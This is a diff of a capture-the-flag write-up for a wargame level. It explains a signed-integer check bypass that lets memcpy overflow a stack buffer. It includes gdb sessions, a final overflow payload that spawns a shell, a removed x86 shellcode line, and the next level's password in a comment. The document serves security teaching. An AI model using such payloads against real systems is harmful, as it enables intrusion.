@@ -31,34 +31,13 @@
 28 }
 ```
 
+Here we see there is a buffer with size 10 and no obvious way to overflow it as there is a check so that the count is always less then 10.
+We can also see that *memcpy* uses the raw count variable. The vulnerability here is that *memcpy* doesn't check if the size is bigger nor negative! It takes size_t and we can give it negative number which if we cast it into unsigned value it will be massive while the first check will still see it as less then 10. 
+
 ```console
 (gdb) disass main
 Dump of assembler code for function main:
-   0x08048414 <+0>:	push   %ebp
-   0x08048415 <+1>:	mov    %esp,%ebp
-   0x08048417 <+3>:	sub    $0x68,%esp
-   0x0804841a <+6>:	and    $0xfffffff0,%esp
-   0x0804841d <+9>:	mov    $0x0,%eax
-   0x08048422 <+14>:	sub    %eax,%esp
-   0x08048424 <+16>:	mov    0xc(%ebp),%eax
-   0x08048427 <+19>:	add    $0x4,%eax
-   0x0804842a <+22>:	mov    (%eax),%eax
-   0x0804842c <+24>:	mov    %eax,(%esp)
-   0x0804842f <+27>:	call   0x8048354 <atoi@plt>
-   0x08048434 <+32>:	mov    %eax,-0xc(%ebp)
-   0x08048437 <+35>:	cmpl   $0x9,-0xc(%ebp)
-   0x0804843b <+39>:	jle    0x8048446 <main+50>
-   0x0804843d <+41>:	movl   $0x1,-0x4c(%ebp)
-   0x08048444 <+48>:	jmp    0x80484ad <main+153>
-   0x08048446 <+50>:	mov    -0xc(%ebp),%eax
-   0x08048449 <+53>:	shl    $0x2,%eax
-   0x0804844c <+56>:	mov    %eax,0x8(%esp)
-   0x08048450 <+60>:	mov    0xc(%ebp),%eax
-   0x08048453 <+63>:	add    $0x8,%eax
-   0x08048456 <+66>:	mov    (%eax),%eax
-   0x08048458 <+68>:	mov    %eax,0x4(%esp)
-   0x0804845c <+72>:	lea    -0x48(%ebp),%eax
-   0x0804845f <+75>:	mov    %eax,(%esp)
+   ...
    0x08048462 <+78>:	call   0x8048334 <memcpy@plt>
    0x08048467 <+83>:	cmpl   $0x574f4c46,-0xc(%ebp)
    0x0804846e <+90>:	jne    0x804849a <main+134>
@@ -76,31 +55,76 @@ Dump of assembler code for function main:
    0x080484b0 <+156>:	leave  
    0x080484b1 <+157>:	ret    
 End of assembler dump.
-(gdb) disass memcpy
-Dump of assembler code for function memcpy:
-   0xb7e85d60 <+0>:	call   0xb7f2f37d
-   0xb7e85d65 <+5>:	add    $0x13c29b,%edx
-   0xb7e85d6b <+11>:	mov    -0xe0(%edx),%ecx
-   0xb7e85d71 <+17>:	lea    -0x13c230(%edx),%eax
-   0xb7e85d77 <+23>:	testl  $0x4000000,0x68(%ecx)
-   0xb7e85d7e <+30>:	je     0xb7e85db3 <memcpy+83>
-   0xb7e85d80 <+32>:	lea    -0x8b480(%edx),%eax
-   0xb7e85d86 <+38>:	testl  $0x10,0x98(%ecx)
-   0xb7e85d90 <+48>:	jne    0xb7e85db3 <memcpy+83>
-   0xb7e85d92 <+50>:	testl  $0x200,0x64(%ecx)
-   0xb7e85d99 <+57>:	je     0xb7e85db3 <memcpy+83>
-   0xb7e85d9b <+59>:	lea    -0x8a690(%edx),%eax
-   0xb7e85da1 <+65>:	testl  $0x1,0x98(%ecx)
-   0xb7e85dab <+75>:	je     0xb7e85db3 <memcpy+83>
-   0xb7e85dad <+77>:	lea    -0x84450(%edx),%eax
-   0xb7e85db3 <+83>:	ret    
-End of assembler dump.
+```
+To find the size needed to overflow I tried a few sizes and looked and the buffer to see how big the overflow was.
+
+First I added a few breakpoints to help me locate the count and see the buffer and specific stages (*i.e.* 0x08048462 and 0x08048467).
+
+```console
+(gdb) b *0x08048462
+Breakpoint 1 at 0x8048462
+(gdb) b *0x08048467
+Breakpoint 2 at 0x8048467
+(gdb) r $(python -c 'print "-2147483648" + " " + "A"*100')
+...
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048467 in main ()
+(gdb) x/44xw $esp
+0xbffffb80:	0xbffffba0	0xbffffdc9	0x00000000	0x00000005
+0xbffffb90:	0x0177ff8e	0xb7fc2000	0xb7e1ae18	0xb7fd5240
+0xbffffba0:	0xb7fc2000	0xbffffc84	0xb7ffed00	0x00200000
+0xbffffbb0:	0xffffffff	0x08049688	0xbffffbc8	0x080482f0
+0xbffffbc0:	0x00000003	0x08049688	0xbffffbe8	0x080484e9
+0xbffffbd0:	0xb7fc23dc	0x0804819c	0x080484db	0x80000000
+0xbffffbe0:	0x00000003	0xb7fc2000	0x00000000	0xb7e26286
+0xbffffbf0:	0x00000003	0xbffffc84	0xbffffc94	0x00000000
+0xbffffc00:	0x00000000	0x00000000	0xb7fc2000	0xb7fffc0c
+0xbffffc10:	0xb7fff000	0x00000000	0x00000003	0xb7fc2000
+0xbffffc20:	0x00000000	0x19254d23	0x22162133	0x00000000
+```
+-2147483648 did not overflow the memcpy so I tried larger number.
+
+```console
+...
+(gdb) r $(python -c 'print "-2147483620" + " " + "A"*100')
+Starting program: /levels/level07 $(python -c 'print "-2147483620" + " " + "A"*100')
+
+Breakpoint 1, 0x08048462 in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048467 in main ()
+(gdb) x/44xw $esp
+0xbffffb80:	0xbffffba0	0xbffffdc9	0x00000070	0x00000005
+0xbffffb90:	0x0177ff8e	0xb7fc2000	0xb7e1ae18	0xb7fd5240
+0xbffffba0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbd0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffc00:	0x41414141	0x47445800	0x5345535f	0x4e4f4953
+0xbffffc10:	0xb7fff000	0x00000000	0x00000003	0xb7fc2000
+0xbffffc20:	0x00000000	0xff51623e	0xc4620e2e	0x00000000
+...
 ```
 
-```
-shellcode = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+Now I was finally overflow the buffer and was able to change the count variable. To figure out the location of the variable I can again check the cmpl instruction.
+
+```console
+0x08048467 <+83>:	cmpl   $0x574f4c46,-0xc(%ebp)
 ```
 
-Change the return address inside the memcpy to point to the shell code or at leaste the NOP slide.
+Now that I have a location I checked how many A's were in ths buffer and trivialy I determined I need 60 A's (or some other bytes) after which I need the number which is checked so my final payload looked like this:
+
+```console
+(gdb)  r $(python -c 'print "-2147483620" + " " + "A"*60 + "\x46\x4c\x4f\x57"')
+Starting program: /levels/level07 $(python -c 'print "-2147483600" + " " + "A"*60 + "\x46\x4c\x4f\x57"')
+WIN!
+process 14128 is executing new program: /bin/bash
+sh-4.3$
+```
 
 <!-- Level 8 password ==> VSIhoeMkikH6SGht -->
